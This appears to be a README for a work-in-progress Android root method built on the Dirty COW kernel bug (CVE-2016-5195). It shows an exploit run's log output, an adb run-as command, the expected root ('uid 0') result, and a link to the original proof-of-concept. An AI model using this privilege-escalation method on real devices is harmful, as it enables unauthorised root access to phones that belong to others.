# DirtyCowAndroid
Repo For Working on Dirty Cow Based Android Root Method  
Currently Linux Only  
  
Current Issue: run-as not working as expected  
Output:  
[*] mmap 0xf7158000  
[*] exploit (patch)  
[*] currently 0xf7158000=464c457f  
[*] madvise = 0xf7158000 14280  
[*] madvise = 0 1048576  
[*] /proc/self/mem -1048576 1048576  
[*] exploited 0xf7158000=464c457f  
adb shell /system/bin/run-as  
run-as: Usage:  
    run-as <package-name> [--user <uid>] <command> [<args>]  
  
Expected Output:  
[*] mmap 0xf7158000  
[*] exploit (patch)  
[*] currently 0xf7158000=464c457f  
[*] madvise = 0xf7158000 14280  
[*] madvise = 0 1048576  
[*] /proc/self/mem -1048576 1048576  
[*] exploited 0xf7158000=464c457f  
adb shell /system/bin/run-as  
running as uid 2000  
uid 0  
  
!!!WARNING HAS NOT BEEN TESTED USE AT OWN RISK!!!   
Oringal PoC Code: https://github.com/timwr/CVE-2016-5195
